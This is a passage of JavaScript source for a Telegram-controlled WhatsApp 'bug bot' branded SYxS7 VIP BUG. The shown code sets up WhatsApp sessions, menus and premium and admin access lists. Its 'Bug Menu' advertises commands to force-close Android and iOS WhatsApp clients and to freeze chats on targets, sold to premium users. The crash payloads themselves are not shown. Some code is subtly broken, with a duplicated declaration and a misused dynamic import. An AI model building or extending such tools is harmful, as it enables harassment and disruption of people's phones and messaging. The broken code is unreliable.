    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = import('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});


const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let tokenValidated = false; // volatile gate: import token each restart
 

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀             「〔 ACCES GRANTED 〕」
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
    
const store = makeInMemoryStore({
  logger: pino().child({ level: 'silent', stream: 'store' })
});
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Unknown";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ S Y x S 7⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

「I」 「〔 SENDER CONNECT 〕」 「I」 `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};


const { RichHTMLBuilder: HTML } = RichMessage;

const checkWhatsAppConnection = async (ctx, next) => {
  if (isWhatsAppConnected && sock?.user) {
    return next();
  }

  const msg = new HTML()

    .heading(
      1,
      HTML.customEmoji("5355021020572962395", "📡") +
      " Sender Offline"
    )

    .divider()

    .blockQuote(
      HTML.bold("WhatsApp Sender is currently disconnected.")
    )

    .paragraph(
      "Bots cannot run features that require a WhatsApp connection.\n\n" +
      "Please connect Sender first before using this command."
    )

    .divider()

    .table(
      [
        ["Status", "Value"],
        ["Connection", "Offline ❌"],
        ["Required", "WhatsApp Sender"],
        ["Action", "Connect Sender"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

    .taskList(
      {
        text: "Telegram Connected",
        checked: true
      },
      {
        text: "WhatsApp Sender Connected",
        checked: false
      }
    )

    .details(
      "📖 Information",
      "Make sure your WhatsApp device is logged back in. Once the status changes to Connected, all commands will be available again.."
    )

    .footer(
      "SYxS7 - VIP - BUG " +
      HTML.customEmoji("6093786598422353987", "👑")
    )

    .build();

  return await ctx.sendRichMessage(msg, {
    protect_content: true,
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Developer",
          url: "https://t.me/Loves_SYxS7",
          style: "success",
          icon_custom_emoji_id: "6104897532788215057"
        }
      ]
    ]).reply_markup
  });
};

// Menu START
const PHOTOS = [
  "https://files.catbox.moe/2bfd29.jpg",
  "https://files.catbox.moe/dxz5qb.jpg",
  "https://files.catbox.moe/9bmfur.jpg"
];

bot.start(async (ctx) => {
const DRAFT_ID = 1  

  const steps = [
  "⚡ Initializing SYxS7 BUG...",
  "📡 Connecting Telegram...",
  "🛡️ Loading Security Module...",
  "📦 Fucking You...",
  "👑 Preparing Rich Menu...",
  "✨ Done!"
];

  for (const step of steps) {
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(step)).build()
    )
    await new Promise((r) => setTimeout(r, 900))
  }


  const msg = new HTML()
  
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    
    .heading(
  1,
  "⏤ Welcome User -「 " +
  HTML.customEmoji("6129608584176076842", "🕷") +
  " 」"
)

    .paragraph(
      `Welcome to SYxS7 bug Vvip Menu Only Premium User Can Use This Bot`
    + HTML.customEmoji("6093786598422353987", "👑" ) 
    )

    .divider()

    .heading(2, HTML.customEmoji("4956680567853679460", "💋") + " Bot Information")

    .table(
      [
        ["Information", "Detail"],
        ["Name", "SYxS7 - VIP - BUG "],
        ["Version", "1.0"],
        ["Status", "🟢 Online"],
        ["System", "Auto Update"],
        ["Dev", "@Loves_SYxS7"]
        
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

    .blockQuote(
      HTML.bold("「 ! 」Select Menu Below 「 ! 」")
    )

    .build();

  await ctx.sendRichMessage(msg, {
  protect_content: true, 
  reply_markup: Markup.inlineKeyboard([
    [
      {
        text: "Bug Menu",
        callback_data: "holee",
        style: "danger", 
        icon_custom_emoji_id: "5355021020572962395"
      },
      {
        text: "Owner Menu",
        callback_data: "p",
        style: "danger", 
        icon_custom_emoji_id: "6248910861419680249"
      },
    ],
    [
      {
        text: "Developer Script",
        url: "https://t.me/Loves_SYxS7",
        style: "success", 
        icon_custom_emoji_id: "6104897532788215057"
      }
    ]
  ]).reply_markup
});

});

// Menu SETTING
bot.action("p", async (ctx) => {
  const userId = ctx.from.id.toString();
  const waStatus = sock && sock.user ? "✅ Connected" : "❌ Not Connected";
  const ICON_BACK = "5776091084467735768"
        
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, '📊 Menu Setting Information')
    .table(
      [
  ['Command', 'Example', 'Description'],

  [
    `/addadmin <id_tele>, <duration>\nExample: /addadmin ${userId}, 30d`, 
    'Give Admin access and title to the script.'
  ],

  [
    '/deladmin',
    `/deladmin <id_tele> Example: /deladmin ${userId}`,
    'Remove Admin access and title from script.'
  ],

  [
    '/addprem',
    `/addprem <id_tele>, <duration> Example: /addprem ${userId}, 30d`,
    'Gives Premium access and title to the script.'
  ],

  [
    '/delprem',
    `/delprem <id_tele> Example: /delprem ${userId}`,
    'Remove Premium access and title from script.'
  ],

  [
    ' /cekprem',
    'Type: /cekprem',
    'Displays your accounts Premium status.'
  ],

  [
    '/addsender',
    '/addsender <numb_wa> Example: /addsender 628123456789',
    'Adding WhatsApp number to Telegram Sender.'
  ],

  [
    '/resetsession',
    'type: /resetsession',
    'Deletes all connected WhatsApp sessions.'
  ],

  [
    '/status',
    'Type: /status',
    'Display WhatsApp Sender connection status.'
  ]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )
    .divider()
    .footer("SYxS7 - VIP - BUG " + HTML.customEmoji("4956680567853679460", "💋"))
    .build();
    
  await ctx.sendRichMessage(msg, {
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Back",
          callback_data: "back_to_start",
          style: "danger",
          icon_custom_emoji_id: ICON_BACK
        }
      ]
    ]).reply_markup
  });
});

bot.action("holee", async (ctx) => {
  await ctx.answerCbQuery();

  const msg = new HTML()
  
      .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    
    .heading(1, "BUG - MENU - SYxS7 - VIP - BUG ")
    
    .divider()

    .heading(2, HTML.customEmoji("6129608584176076842", "🕷") + " Command Bug")

    .table(
      [
        ["Command", "Effect"],
        ["/ForceCloseAndriod", "ForceClose Android"],
        ["/ForceCloseIos", "Foreclose Ios"],
        ["/BlankSYxS7", "Blank Click New"],
        ["/DelayInvisible", "Delay Invisible New"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

  .heading(2, "✅ Infomation Bugs")
  .taskList(
    {
      text: "Target Auto C1",
      checked: true
    },
    {
      text: "Bug Work",
      checked: true
    },
    {
      text: "Free Spam",
      checked: false
    },
    {
      text: "Anti Keno 80",
      checked: true
    }
  )
  
  .details(
  "⚙️ Important Information",
  `
If you encounter any bugs or errors, please contact @Loves_SYxS7.
If you have any suggestions or feedback, please contact us. 
 
  `
)

  .build();

  await ctx.sendRichMessage(msg);
});

// Tombol Back
bot.action("back_to_start", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user ? "✅ Connected" : "❌ Not Connected";
  
  const msg = new HTML()
  
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    
    .heading(
  1,
  "⏤ Welcome User -「 " +
  HTML.customEmoji("6129608584176076842", "🕷") +
  " 」"
)

    .paragraph(
      `Welcome to SYxS7 bug Vvip Menu Only Premium User Can Use This Bot`
    + HTML.customEmoji("6093786598422353987", "👑" ) 
    )

    .divider()

    .heading(2, HTML.customEmoji("4956680567853679460", "💋") + " Bot Information")

    .table(
      [
   ["Information", "Detail"],
        ["Name", "SYxS7 - VIP - BUG "],
        ["Version", "1.0"],
        ["Status", "🟢 Online"],
        ["System", "Auto Update"],
        ["Dev", "@Loves_SYxS7"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

    .blockQuote(
      HTML.bold("「 ! 」Select Menu Below 「 ! 」")
    )

    .build();

  await ctx.sendRichMessage(msg, {
  protect_content: true, 
  reply_markup: Markup.inlineKeyboard([
    [
      {
        text: "Bug Menu",
        callback_data: "holee",
        style: "danger", 
        icon_custom_emoji_id: "5355021020572962395"
      },
      {
        text: "Owner Menu",
        callback_data: "p",
        style: "danger", 
        icon_custom_emoji_id: "6248910861419680249"
      },
    ],
    [
      {
        text: "Developer Script",
        url: "https://t.me/Loves_SYxS7",
        style: "success", 
        icon_custom_emoji_id: "6104897532788215057"
      }
    ]
  ]).reply_markup
});

});

// BATAS MENU SAMA TOOLS

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Wrong Format!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} already has admin status.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ User ${userId} now has admin access!`);
});

bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Wrong Format!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} already has premium access.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ User ${userId} is now premium.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Wrong Format!. Example : /deladmin 12345678");
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} is not in the Admin list.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 User ${userId} has been removed from the Admin list.`);
});

bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Wrong Format!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} is not in the premium list.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

